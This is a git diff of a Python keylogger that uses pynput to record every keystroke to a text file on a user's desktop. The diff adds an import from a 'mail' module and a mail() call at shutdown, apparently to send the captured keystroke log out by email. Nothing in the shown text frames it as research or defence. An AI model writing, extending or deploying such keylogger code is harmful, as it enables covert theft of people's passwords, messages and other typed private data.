@@ -1,5 +1,6 @@
 from pynput import keyboard
 import time
+from mail import *
 
 # creating a new file named keys
 keys = open(r"C:\Users\Ritick Madaan\Desktop\keys.txt", "w")
@@ -19,12 +20,12 @@ def on_press(key):
     global keys  # to prevent unbound local error
     global i_time
     # if(time.time() - i_time <= 2):
-    print(time.time() - i_time)
+    # print(time.time() - i_time)
     if key in close_combination:
         current.add(key)
         if all(k in current for k in close_combination):
-
             keys.close()
+            mail()
             listener.stop()
 
     else:
@@ -80,5 +81,3 @@ listener = keyboard.Listener(
     on_press=on_press,
     on_release=on_release)
 listener.start()
-
-# does it work fine next line
